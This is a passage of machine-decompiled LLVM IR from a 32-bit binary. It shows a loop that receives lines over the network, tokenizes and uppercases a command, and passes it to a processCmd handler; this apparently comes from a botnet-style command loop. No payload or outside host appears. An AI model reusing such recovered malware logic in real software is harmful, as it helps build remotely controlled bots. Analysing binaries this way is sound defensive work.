  br i1 %v7_8049644, label %dec_label_pc_8049651, label %dec_label_pc_8049648

dec_label_pc_8049648:                             ; preds = %dec_label_pc_8049633, %dec_label_pc_804963c
  %v5_8049642112 = phi i32 [ %v5_8049642, %dec_label_pc_804963c ], [ %v5_8049629, %dec_label_pc_8049633 ]
  %storemerge21111 = phi i8* [ %storemerge21, %dec_label_pc_804963c ], [ %v5_8049668, %dec_label_pc_8049633 ]
  %storemerge21.in110 = phi i32 [ %v5_804963c, %dec_label_pc_804963c ], [ %v1_8049636, %dec_label_pc_8049633 ]
  store i32 %storemerge21.in110, i32* %eax.global-to-local, align 4
  %v2_804964b = load i8, i8* %storemerge21111, align 1
  %v3_804964b = zext i8 %v2_804964b to i32
  %v6_804964b = or i32 %v3_804964b, %v5_8049642112
  store i32 %v6_804964b, i32* %eax.global-to-local, align 4
  %v4_804964d = icmp eq i8 %v2_804964b, 0
  %v1_804964f = icmp eq i1 %v4_804964d, false
  br i1 %v1_804964f, label %dec_label_pc_804963c, label %dec_label_pc_8049651

dec_label_pc_8049651:                             ; preds = %dec_label_pc_804963c, %dec_label_pc_8049648, %dec_label_pc_8049633
  %storemerge21.in.lcssa = phi i32 [ %v1_8049636, %dec_label_pc_8049633 ], [ %storemerge21.in110, %dec_label_pc_8049648 ], [ %v5_804963c, %dec_label_pc_804963c ]
  %storemerge21.lcssa = phi i8* [ %v5_8049668, %dec_label_pc_8049633 ], [ %storemerge21111, %dec_label_pc_8049648 ], [ %storemerge21, %dec_label_pc_804963c ]
  %v5_8049642.lcssa = phi i32 [ %v5_8049629, %dec_label_pc_8049633 ], [ %v5_8049642112, %dec_label_pc_8049648 ], [ %v5_8049642, %dec_label_pc_804963c ]
  store i32 %storemerge21.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_8049654 = load i8, i8* %storemerge21.lcssa, align 1
  %v3_8049654 = zext i8 %v2_8049654 to i32
  %v6_8049654 = or i32 %v3_8049654, %v5_8049642.lcssa
  store i32 %v6_8049654, i32* %eax.global-to-local, align 4
  %v4_8049656 = icmp eq i8 %v2_8049654, 0
  br i1 %v4_8049656, label %dec_label_pc_804983b, label %dec_label_pc_804965e

dec_label_pc_804965e:                             ; preds = %dec_label_pc_8049651
  store i8 0, i8* %storemerge21.lcssa, align 1
  store i32 %v1_8049636, i32* %eax.global-to-local, align 4
  %v0_804966e = load i32, i32* @esp, align 4
  %v2_8049671 = add i32 %v0_804966e, -16
  %v3_8049671 = inttoptr i32 %v2_8049671 to i32*
  store i32 %v1_8049636, i32* %v3_8049671, align 4
  %v3_8049672 = call i32 @strlen(i8* %v5_8049668)
  %v0_8049677 = load i32, i32* @esp, align 4
  %v1_8049677 = add i32 %v0_8049677, 16
  %v6_804967a = add i32 %v3_8049672, %v2_804983b
  %v1_804967d = add i32 %v6_804967a, 2
  store i32 %v1_804967d, i32* %eax.global-to-local, align 4
  %v5_8049680 = inttoptr i32 %v1_804967d to i8*
  %v1_80496a1 = add i32 %v6_804967a, 1
  br label %dec_label_pc_804969e

dec_label_pc_8049685:                             ; preds = %dec_label_pc_80496ba, %dec_label_pc_804969e
  %v0_804968c.in = phi i32 [ %v0_80496ca, %dec_label_pc_80496ba ], [ %v0_80496ae, %dec_label_pc_804969e ]
  store i32 %v1_80496a1, i32* %ebx.global-to-local, align 4
  store i32 %v1_804967d, i32* %eax.global-to-local, align 4
  %v3_804968f = inttoptr i32 %v0_804968c.in to i32*
  store i32 %v1_804967d, i32* %v3_804968f, align 4
  %v3_8049690 = call i32 @strlen(i8* %v5_8049680)
  %v0_8049698 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049698 = add i32 %v0_8049698, %v3_8049690
  store i32 %v2_8049698, i32* %eax.global-to-local, align 4
  %v1_804969b = inttoptr i32 %v2_8049698 to i8*
  store i8 0, i8* %v1_804969b, align 1
  %v0_80496a5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804969e

dec_label_pc_804969e:                             ; preds = %dec_label_pc_804965e, %dec_label_pc_8049685
  %v0_80496a5 = phi i32 [ %v1_8049677, %dec_label_pc_804965e ], [ %v0_80496a5.pre, %dec_label_pc_8049685 ]
  store i32 %v1_80496a1, i32* %ebx.global-to-local, align 4
  store i32 %v1_804967d, i32* %eax.global-to-local, align 4
  %v2_80496a8 = add i32 %v0_80496a5, -16
  %v3_80496a8 = inttoptr i32 %v2_80496a8 to i32*
  store i32 %v1_804967d, i32* %v3_80496a8, align 4
  %v3_80496a9 = call i32 @strlen(i8* %v5_8049680)
  %v0_80496ae = load i32, i32* @esp, align 4
  %v0_80496b1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80496b1 = add i32 %v0_80496b1, %v3_80496a9
  store i32 %v2_80496b1, i32* %eax.global-to-local, align 4
  %v1_80496b4 = inttoptr i32 %v2_80496b1 to i8*
  %v2_80496b4 = load i8, i8* %v1_80496b4, align 1
  %v3_80496b4 = zext i8 %v2_80496b4 to i32
  %v5_80496b4 = and i32 %v2_80496b1, -256
  %v6_80496b4 = or i32 %v3_80496b4, %v5_80496b4
  store i32 %v6_80496b4, i32* %eax.global-to-local, align 4
  %v10_80496b6 = icmp eq i8 %v2_80496b4, 10
  br i1 %v10_80496b6, label %dec_label_pc_8049685, label %dec_label_pc_80496ba

dec_label_pc_80496ba:                             ; preds = %dec_label_pc_804969e
  store i32 %v1_80496a1, i32* @ebx, align 4
  store i32 %v1_804967d, i32* %eax.global-to-local, align 4
  %v3_80496c4 = inttoptr i32 %v0_80496ae to i32*
  store i32 %v1_804967d, i32* %v3_80496c4, align 4
  %v3_80496c5 = call i32 @strlen(i8* %v5_8049680)
  %v0_80496ca = load i32, i32* @esp, align 4
  %v0_80496cd = load i32, i32* @ebx, align 4
  %v2_80496cd = add i32 %v0_80496cd, %v3_80496c5
  store i32 %v2_80496cd, i32* %eax.global-to-local, align 4
  %v1_80496d0 = inttoptr i32 %v2_80496cd to i8*
  %v2_80496d0 = load i8, i8* %v1_80496d0, align 1
  %v3_80496d0 = zext i8 %v2_80496d0 to i32
  %v5_80496d0 = and i32 %v2_80496cd, -256
  %v6_80496d0 = or i32 %v3_80496d0, %v5_80496d0
  store i32 %v6_80496d0, i32* %eax.global-to-local, align 4
  %v10_80496d2 = icmp eq i8 %v2_80496d0, 13
  br i1 %v10_80496d2, label %dec_label_pc_8049685, label %dec_label_pc_80496d6

dec_label_pc_80496d6:                             ; preds = %dec_label_pc_80496ba
  store i32 %v1_804967d, i32* %eax.global-to-local, align 4
  %v2_80496e4119 = load i8, i8* %v5_8049680, align 1
  %v3_80496e4120 = zext i8 %v2_80496e4119 to i32
  %v5_80496e4121 = and i32 %v1_804967d, -256
  %v6_80496e4122 = or i32 %v3_80496e4120, %v5_80496e4121
  store i32 %v6_80496e4122, i32* %eax.global-to-local, align 4
  %v7_80496e6123 = icmp eq i8 %v2_80496e4119, 32
  br i1 %v7_80496e6123, label %dec_label_pc_80496f3, label %dec_label_pc_80496ea

dec_label_pc_80496de:                             ; preds = %dec_label_pc_80496ea
  %v5_80496de = add i32 %v4_80496e1125, 1
  %v22_80496de = inttoptr i32 %v5_80496de to i8*
  store i32 %v5_80496de, i32* %eax.global-to-local, align 4
  %v2_80496e4 = load i8, i8* %v22_80496de, align 1
  %v3_80496e4 = zext i8 %v2_80496e4 to i32
  %v5_80496e4 = and i32 %v5_80496de, -256
  %v6_80496e4 = or i32 %v3_80496e4, %v5_80496e4
  store i32 %v6_80496e4, i32* %eax.global-to-local, align 4
  %v7_80496e6 = icmp eq i8 %v2_80496e4, 32
  br i1 %v7_80496e6, label %dec_label_pc_80496f3, label %dec_label_pc_80496ea

dec_label_pc_80496ea:                             ; preds = %dec_label_pc_80496d6, %dec_label_pc_80496de
  %v5_80496e4126 = phi i32 [ %v5_80496e4, %dec_label_pc_80496de ], [ %v5_80496e4121, %dec_label_pc_80496d6 ]
  %v4_80496e1125 = phi i32 [ %v5_80496de, %dec_label_pc_80496de ], [ %v1_804967d, %dec_label_pc_80496d6 ]
  %stack_var_-52.1124 = phi i8* [ %v22_80496de, %dec_label_pc_80496de ], [ %v5_8049680, %dec_label_pc_80496d6 ]
  store i32 %v4_80496e1125, i32* %eax.global-to-local, align 4
  %v2_80496ed = load i8, i8* %stack_var_-52.1124, align 1
  %v3_80496ed = zext i8 %v2_80496ed to i32
  %v6_80496ed = or i32 %v3_80496ed, %v5_80496e4126
  store i32 %v6_80496ed, i32* %eax.global-to-local, align 4
  %v4_80496ef = icmp eq i8 %v2_80496ed, 0
  %v1_80496f1 = icmp eq i1 %v4_80496ef, false
  br i1 %v1_80496f1, label %dec_label_pc_80496de, label %dec_label_pc_80496f3

dec_label_pc_80496f3:                             ; preds = %dec_label_pc_80496de, %dec_label_pc_80496ea, %dec_label_pc_80496d6
  %stack_var_-52.1.lcssa = phi i8* [ %v5_8049680, %dec_label_pc_80496d6 ], [ %stack_var_-52.1124, %dec_label_pc_80496ea ], [ %v22_80496de, %dec_label_pc_80496de ]
  %v4_80496e1.lcssa = phi i32 [ %v1_804967d, %dec_label_pc_80496d6 ], [ %v4_80496e1125, %dec_label_pc_80496ea ], [ %v5_80496de, %dec_label_pc_80496de ]
  store i8 0, i8* %stack_var_-52.1.lcssa, align 1
  %v5_80496f9 = add i32 %v4_80496e1.lcssa, 1
  store i32 %v1_804967d, i32* %eax.global-to-local, align 4
  %v2_8049727132 = load i8, i8* %v5_8049680, align 1
  %v3_8049727133 = zext i8 %v2_8049727132 to i32
  %v6_8049727135 = or i32 %v3_8049727133, %v5_80496e4121
  store i32 %v6_8049727135, i32* %eax.global-to-local, align 4
  %v4_8049729136 = icmp eq i8 %v2_8049727132, 0
  %v1_804972b137 = icmp eq i1 %v4_8049729136, false
  br i1 %v1_804972b137, label %dec_label_pc_8049704, label %dec_label_pc_804972d

dec_label_pc_8049704:                             ; preds = %dec_label_pc_80496f3, %dec_label_pc_8049704
  %v4_8049724139 = phi i32 [ %v5_8049721, %dec_label_pc_8049704 ], [ %v1_804967d, %dec_label_pc_80496f3 ]
  %storemerge20138 = phi i8* [ %v22_8049721, %dec_label_pc_8049704 ], [ %v5_8049680, %dec_label_pc_80496f3 ]
  store i32 %v4_8049724139, i32* %eax.global-to-local, align 4
  %v2_8049707 = load i8, i8* %storemerge20138, align 1
  %v3_8049707 = zext i8 %v2_8049707 to i32
  store i32 %v3_8049707, i32* %eax.global-to-local, align 4
  %v0_804970e = load i32, i32* @esp, align 4
  %v2_8049711 = add i32 %v0_804970e, -16
  %v3_8049711 = inttoptr i32 %v2_8049711 to i32*
  store i32 %v3_8049707, i32* %v3_8049711, align 4
  %v0_8049712 = call i32 @__GI_toupper()
  %v1_804971a = urem i32 %v0_8049712, 256
  %v2_804971a = load i32, i32* @edx, align 4
  %v3_804971a = and i32 %v2_804971a, -256
  %v4_804971a = or i32 %v3_804971a, %v1_804971a
  store i32 %v4_804971a, i32* %edx.global-to-local, align 4
  %v1_804971f = trunc i32 %v0_8049712 to i8
  store i8 %v1_804971f, i8* %storemerge20138, align 1
  %v5_8049721 = add i32 %v4_8049724139, 1
  %v22_8049721 = inttoptr i32 %v5_8049721 to i8*
  store i32 %v5_8049721, i32* %eax.global-to-local, align 4
  %v2_8049727 = load i8, i8* %v22_8049721, align 1
  %v3_8049727 = zext i8 %v2_8049727 to i32
  %v5_8049727 = and i32 %v5_8049721, -256
  %v6_8049727 = or i32 %v3_8049727, %v5_8049727
  store i32 %v6_8049727, i32* %eax.global-to-local, align 4
  %v4_8049729 = icmp eq i8 %v2_8049727, 0
  %v1_804972b = icmp eq i1 %v4_8049729, false
  br i1 %v1_804972b, label %dec_label_pc_8049704, label %dec_label_pc_804972d

dec_label_pc_804972d:                             ; preds = %dec_label_pc_8049704, %dec_label_pc_80496f3
  %v22_80496f9 = inttoptr i32 %v5_80496f9 to i8*
  store i32 %v5_80496f9, i32* %eax.global-to-local, align 4
  %v0_8049737 = load i32, i32* @esp, align 4
  %v1_804973a = add i32 %v0_8049737, -12
  %v2_804973a = inttoptr i32 %v1_804973a to i32*
  store i32 ptrtoint (i32* @global_var_805085b.26 to i32), i32* %v2_804973a, align 4
  %v0_804973f = load i32, i32* %eax.global-to-local, align 4
  %v2_804973f = add i32 %v0_8049737, -16
  %v3_804973f = inttoptr i32 %v2_804973f to i32*
  store i32 %v0_804973f, i32* %v3_804973f, align 4
  %v1_8049740 = load i8*, i8** %stack_var_-24, align 4
  %v2_8049740 = ptrtoint i8* %v1_8049740 to i32
  %v3_8049740 = call i32 @__GI_strtok(i32 1, i32 %v2_8049740)
  %v0_8049745 = load i32, i32* @esp, align 4
  %v1_8049745 = add i32 %v0_8049745, 16
  %v5_8049748 = inttoptr i32 %v3_8049740 to i8*
  store i8* %v5_8049748, i8** %stack_var_-24, align 4
  store i32 %v1_804967d, i32* %eax.global-to-local, align 4
  store i8* %v5_8049680, i8** %stack_var_-180, align 4
  %v5_80497e527 = icmp eq i32 %v3_8049740, 0
  %v1_80497e934 = icmp eq i1 %v5_80497e527, false
  br i1 %v1_80497e934, label %dec_label_pc_8049759, label %dec_label_pc_80497ef

dec_label_pc_8049759:                             ; preds = %dec_label_pc_804972d, %dec_label_pc_80497d0
  %v0_8049768 = phi i32 [ %v1_80497df, %dec_label_pc_80497d0 ], [ %v1_8049745, %dec_label_pc_804972d ]
  %v3_8049765 = phi i8* [ %tmp103, %dec_label_pc_80497d0 ], [ %v5_8049748, %dec_label_pc_804972d ]
  %stack_var_-28.135 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80497d0 ], [ 1, %dec_label_pc_804972d ]
  %v4_8049759 = ptrtoint i8* %v3_8049765 to i32
  store i32 %v4_8049759, i32* %eax.global-to-local, align 4
  %v2_804975c = load i8, i8* %v3_8049765, align 1
  %v3_804975c = zext i8 %v2_804975c to i32
  %v5_804975c = and i32 %v4_8049759, -256
  %v6_804975c = or i32 %v3_804975c, %v5_804975c
  store i32 %v6_804975c, i32* %eax.global-to-local, align 4
  %v10_804975e = icmp eq i8 %v2_804975c, 10
  br i1 %v10_804975e, label %dec_label_pc_80497d0, label %dec_label_pc_8049762

dec_label_pc_8049762:                             ; preds = %dec_label_pc_8049759
  store i32 %stack_var_-28.135, i32* @ebx, align 4
  store i32 %v4_8049759, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v0_8049768, -16
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v4_8049759, i32* %v3_804976b, align 4
  %v0_804976c = load i8*, i8** %stack_var_-180, align 4
  %v3_804976c = call i32 @strlen(i8* %v0_804976c)
  %v0_8049771 = load i32, i32* @esp, align 4
  %v1_8049774 = add i32 %v3_804976c, 1
  store i32 %v1_8049774, i32* %eax.global-to-local, align 4
  %v3_8049778 = inttoptr i32 %v0_8049771 to i32*
  store i32 %v1_8049774, i32* %v3_8049778, align 4
  %v0_8049779 = load i8*, i8** %stack_var_-180, align 4
  %v1_8049779 = ptrtoint i8* %v0_8049779 to i32
  %v2_8049779 = call i32 @malloc(i32 %v1_8049779)
  %v1_8049781 = load i32, i32* @ebp, align 4
  %v2_8049781 = load i32, i32* @ebx, align 4
  %v3_8049781 = mul i32 %v2_8049781, 4
  %v4_8049781 = add i32 %v1_8049781, -172
  %v5_8049781 = add i32 %v4_8049781, %v3_8049781
  %v6_8049781 = inttoptr i32 %v5_8049781 to i32*
  store i32 %v2_8049779, i32* %v6_8049781, align 4
  %v3_8049788 = load i8*, i8** %stack_var_-24, align 4
  %v4_8049788 = ptrtoint i8* %v3_8049788 to i32
  store i32 %v4_8049788, i32* %eax.global-to-local, align 4
  %v0_804978b = load i32, i32* @esp, align 4
  %v2_804978e = add i32 %v0_804978b, -16
  %v3_804978e = inttoptr i32 %v2_804978e to i32*
  store i32 %v4_8049788, i32* %v3_804978e, align 4
  %v0_804978f = load i8*, i8** %stack_var_-180, align 4
  %v3_804978f = call i32 @strlen(i8* %v0_804978f)
  %v0_8049794 = load i32, i32* @esp, align 4
  %v1_8049797 = add i32 %v3_804978f, 1
  store i32 %v1_8049797, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-28.135, i32* %eax.global-to-local, align 4
  %v0_804979d = load i32, i32* @ebp, align 4
  %v2_804979d = mul i32 %stack_var_-28.135, 4
  %v3_804979d = add i32 %v2_804979d, -172
  %v4_804979d = add i32 %v0_804979d, %v3_804979d
  %v5_804979d = inttoptr i32 %v4_804979d to i32*
  %v6_804979d = load i32, i32* %v5_804979d, align 4
  store i32 %v6_804979d, i32* %eax.global-to-local, align 4
  %v2_80497a7 = add i32 %v0_8049794, 8
  %v3_80497a7 = inttoptr i32 %v2_80497a7 to i32*
  store i32 %v1_8049797, i32* %v3_80497a7, align 4
  %v1_80497a8 = add i32 %v0_8049794, 4
  %v2_80497a8 = inttoptr i32 %v1_80497a8 to i32*
  store i32 0, i32* %v2_80497a8, align 4
  %v0_80497aa = load i32, i32* %eax.global-to-local, align 4
  %v3_80497aa = inttoptr i32 %v0_8049794 to i32*
  store i32 %v0_80497aa, i32* %v3_80497aa, align 4
  %v0_80497ab = load i8*, i8** %stack_var_-180, align 4
  %v5_80497ab = call i32 @__GI_memset(i8* %v0_80497ab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80497b0 = load i32, i32* @esp, align 4
  %v3_80497b3 = load i8*, i8** %stack_var_-24, align 4
  %v4_80497b3 = ptrtoint i8* %v3_80497b3 to i32
  store i32 %v4_80497b3, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-28.135, i32* %eax.global-to-local, align 4
  %v0_80497b9 = load i32, i32* @ebp, align 4
  %v4_80497b9 = add i32 %v0_80497b9, %v3_804979d
  %v5_80497b9 = inttoptr i32 %v4_80497b9 to i32*
  %v6_80497b9 = load i32, i32* %v5_80497b9, align 4
  store i32 %v6_80497b9, i32* @eax, align 4
  %v2_80497c3 = add i32 %v0_80497b0, 4
  %v3_80497c3 = inttoptr i32 %v2_80497c3 to i32*
  store i32 %v4_80497b3, i32* %v3_80497c3, align 4
  %v0_80497c4 = load i32, i32* @eax, align 4
  %v3_80497c4 = inttoptr i32 %v0_80497b0 to i32*
  store i32 %v0_80497c4, i32* %v3_80497c4, align 4
  %v0_80497c5 = load i8*, i8** %stack_var_-180, align 4
  %v4_80497c5 = call i32 @strcpy(i8* %v0_80497c5, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80497c5, i32* %eax.global-to-local, align 4
  %v0_80497ca = load i32, i32* @esp, align 4
  %v1_80497ca = add i32 %v0_80497ca, 16
  %v4_80497cd = add i32 %stack_var_-28.135, 1
  br label %dec_label_pc_80497d0

dec_label_pc_80497d0:                             ; preds = %dec_label_pc_8049759, %dec_label_pc_8049762
  %v0_80497d0 = phi i32 [ %v0_8049768, %dec_label_pc_8049759 ], [ %v1_80497ca, %dec_label_pc_8049762 ]
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.135, %dec_label_pc_8049759 ], [ %v4_80497cd, %dec_label_pc_8049762 ]
  %v1_80497d3 = add i32 %v0_80497d0, -12
  %v2_80497d3 = inttoptr i32 %v1_80497d3 to i32*
  store i32 ptrtoint (i32* @global_var_805085b.26 to i32), i32* %v2_80497d3, align 4
  %v1_80497d8 = add i32 %v0_80497d0, -16
  %v2_80497d8 = inttoptr i32 %v1_80497d8 to i32*
  store i32 0, i32* %v2_80497d8, align 4
  %v1_80497da = load i8*, i8** %stack_var_-24, align 4
  %v2_80497da = ptrtoint i8* %v1_80497da to i32
  %v3_80497da = call i32 @__GI_strtok(i32 %stack_var_-28.0, i32 %v2_80497da)
  store i32 %v3_80497da, i32* %eax.global-to-local, align 4
  %v0_80497df = load i32, i32* @esp, align 4
  %v1_80497df = add i32 %v0_80497df, 16
  store i32 %v3_80497da, i32* %tmp101, align 4
  %v5_80497e5 = icmp eq i32 %v3_80497da, 0
  %v1_80497e9 = icmp eq i1 %v5_80497e5, false
  %tmp103 = inttoptr i32 %v3_80497da to i8*
  br i1 %v1_80497e9, label %dec_label_pc_8049759, label %dec_label_pc_80497ef

dec_label_pc_80497ef:                             ; preds = %dec_label_pc_80497d0, %dec_label_pc_804972d
  %v0_80497ef = phi i32 [ %v1_8049745, %dec_label_pc_804972d ], [ %v1_80497df, %dec_label_pc_80497d0 ]
  %stack_var_-28.1.lcssa = phi i32 [ 1, %dec_label_pc_804972d ], [ %stack_var_-28.0, %dec_label_pc_80497d0 ]
  store i32 %v2_80497f2, i32* %eax.global-to-local, align 4
  %v2_80497f8 = add i32 %v0_80497ef, -12
  %v3_80497f8 = inttoptr i32 %v2_80497f8 to i32*
  store i32 %v2_80497f2, i32* %v3_80497f8, align 4
  %v5_80497f9 = add i32 %v0_80497ef, -16
  %v6_80497f9 = inttoptr i32 %v5_80497f9 to i32*
  store i32 %stack_var_-28.1.lcssa, i32* %v6_80497f9, align 4
  %v0_80497fc = call i32 @processCmd()
  store i32 %v0_80497fc, i32* %eax.global-to-local, align 4
  %v0_8049801 = load i32, i32* @esp, align 4
  %v1_8049801 = add i32 %v0_8049801, 16
  %v7_8049808 = icmp sgt i32 %stack_var_-28.1.lcssa, 1
  br i1 %v7_8049808, label %dec_label_pc_804981a.lr.ph, label %dec_label_pc_804983b

dec_label_pc_804981a.lr.ph:                       ; preds = %dec_label_pc_80497ef
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804981a

dec_label_pc_804981a:                             ; preds = %dec_label_pc_804981a.lr.ph, %dec_label_pc_804981a
  %storemerge142 = phi i32 [ 1, %dec_label_pc_804981a.lr.ph ], [ %v4_8049830, %dec_label_pc_804981a ]
  %v0_8049824141 = phi i32 [ %v1_8049801, %dec_label_pc_804981a.lr.ph ], [ %v1_804982d, %dec_label_pc_804981a ]
  store i32 %storemerge142, i32* %eax.global-to-local, align 4
  %v0_804981d = load i32, i32* @ebp, align 4
  %v2_804981d = mul i32 %storemerge142, 4
  %v3_804981d = add i32 %v2_804981d, -172
  %v4_804981d = add i32 %v3_804981d, %v0_804981d
  %v5_804981d = inttoptr i32 %v4_804981d to i32*
  %v6_804981d = load i32, i32* %v5_804981d, align 4
  store i32 %v6_804981d, i32* %eax.global-to-local, align 4
  %v2_8049827 = add i32 %v0_8049824141, -16
  %v3_8049827 = inttoptr i32 %v2_8049827 to i32*
  store i32 %v6_804981d, i32* %v3_8049827, align 4
  %v1_8049828 = call i32 @free(i32 %storemerge142)
  %v0_804982d = load i32, i32* @esp, align 4
  %v1_804982d = add i32 %v0_804982d, 16
  %v4_8049830 = add nuw i32 %storemerge142, 1
  store i32 %v4_8049830, i32* %eax.global-to-local, align 4
  %v15_8049836 = icmp eq i32 %v4_8049830, %stack_var_-28.1.lcssa
  br i1 %v15_8049836, label %dec_label_pc_804983b, label %dec_label_pc_804981a

dec_label_pc_804983b:                             ; preds = %dec_label_pc_804981a, %dec_label_pc_80497ef, %dec_label_pc_8049651, %dec_label_pc_8049600, %dec_label_pc_804983b.preheader
  %v0_8049847 = phi i32 [ %v0_8049847.pre, %dec_label_pc_804983b.preheader ], [ %v1_804961a, %dec_label_pc_8049600 ], [ %v1_804961a, %dec_label_pc_8049651 ], [ %v1_8049801, %dec_label_pc_80497ef ], [ %v1_804982d, %dec_label_pc_804981a ]
  %stack_var_-52.2 = phi i8* [ %stack_var_-52.0.ph, %dec_label_pc_804983b.preheader ], [ %tmp100, %dec_label_pc_8049600 ], [ %tmp100, %dec_label_pc_8049651 ], [ %v22_80496f9, %dec_label_pc_80497ef ], [ %v22_80496f9, %dec_label_pc_804981a ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_804983b.preheader ], [ %stack_var_-48.2, %dec_label_pc_8049600 ], [ %stack_var_-48.2, %dec_label_pc_8049651 ], [ %stack_var_-48.2, %dec_label_pc_80497ef ], [ %stack_var_-48.2, %dec_label_pc_804981a ]
  store i32 %v2_804983b, i32* %eax.global-to-local, align 4
  %v0_8049841 = load i32, i32* @global_var_80535c0.15, align 64
  store i32 %v0_8049841, i32* %edx.global-to-local, align 4
  %v1_804984a = add i32 %v0_8049847, -8
  %v2_804984a = inttoptr i32 %v1_804984a to i32*
  store i32 4096, i32* %v2_804984a, align 4
  %v2_804984f = add i32 %v0_8049847, -12
  %v3_804984f = inttoptr i32 %v2_804984f to i32*
  store i32 %v2_804983b, i32* %v3_804984f, align 4
  %v0_8049850 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049850 = add i32 %v0_8049847, -16
  %v3_8049850 = inttoptr i32 %v2_8049850 to i32*
  store i32 %v0_8049850, i32* %v3_8049850, align 4
  %v0_8049851 = call i32 @recvLine()
  store i32 %v0_8049851, i32* %eax.global-to-local, align 4
  %v13_804985c = icmp eq i32 %v0_8049851, -1
  %v1_8049860 = icmp eq i1 %v13_804985c, false
  br i1 %v1_8049860, label %dec_label_pc_80495a7.preheader, label %dec_label_pc_80493d8.outer

dec_label_pc_80495a7.preheader:                   ; preds = %dec_label_pc_804983b
  %v0_8049856 = load i32, i32* @esp, align 4
  %v2_804941a = ptrtoint i8* %stack_var_-52.2 to i32
  br label %dec_label_pc_80495a7

; uselistorder directives
  uselistorder i32 %v0_8049851, { 0, 2, 1 }
  uselistorder i8* %stack_var_-52.2, { 1, 0 }
  uselistorder i32 %v0_8049847, { 2, 1, 0 }
  uselistorder i32 %v4_8049830, { 1, 0, 2 }
  uselistorder i32 %storemerge142, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1.lcssa, { 0, 2, 1 }
  uselistorder i32 %v0_80497ef, { 1, 0 }
  uselistorder i32 %v3_80497da, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-28.0, { 0, 2, 1 }
  uselistorder i32 %v0_80497d0, { 1, 0 }
  uselistorder i32 %v0_80497b0, { 1, 0 }
  uselistorder i32 %v0_8049794, { 2, 0, 1 }
  uselistorder i32 %v4_8049759, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-28.135, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 %v1_8049745, { 1, 0 }
  uselistorder i8* %v22_8049721, { 1, 0 }
  uselistorder i32 %v5_8049721, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8049712, { 1, 0 }
  uselistorder i8* %storemerge20138, { 1, 0 }
  uselistorder i32 %v4_8049724139, { 1, 0 }
  uselistorder i32 %v5_80496e4121, { 1, 0, 2 }
  uselistorder i32 %v0_80496ae, { 1, 0 }
  uselistorder i32 %v1_80496a1, { 0, 2, 1 }
  uselistorder i8* %v5_8049680, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804967d, { 10, 0, 3, 1, 2, 4, 5, 7, 11, 8, 12, 6, 9, 13, 14 }
  uselistorder i8* %storemerge21.lcssa, { 1, 0 }
  uselistorder i32 %v5_804963c, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_80495bc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80495b7, { 1, 0, 2 }
  uselistorder i32 %storemerge22, { 2, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-48.2, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_8049412.in, { 2, 1, 0 }
  uselistorder i32 %v0_804954a, { 1, 0, 2 }
  uselistorder i32 %storemerge23, { 1, 0, 2 }
  uselistorder i32 %v2_8049517, { 2, 0, 1 }
  uselistorder i32 %v1_8049500, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80494c7, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804946f, { 1, 0, 2 }
  uselistorder i32 %storemerge24, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804943e, { 2, 0, 1 }
  uselistorder i32 %v0_8049433, { 1, 0 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8049403, { 1, 0 }
  uselistorder i8* %v5_8049668, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8049636, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v2_804983b, { 5, 6, 0, 3, 4, 1, 2 }
  uselistorder i32 %v1_804936c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8049359, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8049314, { 1, 0 }
  uselistorder i32 %v2_8049306, { 1, 0 }
  uselistorder i32 %v2_80492a5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_804929c, { 1, 0 }
  uselistorder i32 %v2_8049281, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4368, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i8** %stack_var_-180, { 2, 3, 4, 6, 5, 1, 0 }
  uselistorder i8** %stack_var_-24, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 7, 9, 10, 11, 12, 5, 13, 15, 14, 0, 1, 3, 2, 4, 8 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 24, 25, 9, 7, 8, 3, 10, 11, 12, 13, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 62, 63, 60, 61, 6, 1, 64, 65, 66, 67, 5, 2, 68, 69, 70, 73, 74, 75, 71, 72, 76, 77, 78, 79, 80, 81, 82, 83, 0, 4, 84, 85, 86, 23, 87, 88, 89, 92, 90, 91, 93, 94, 14, 17, 15, 16, 18, 19, 20, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 0 }
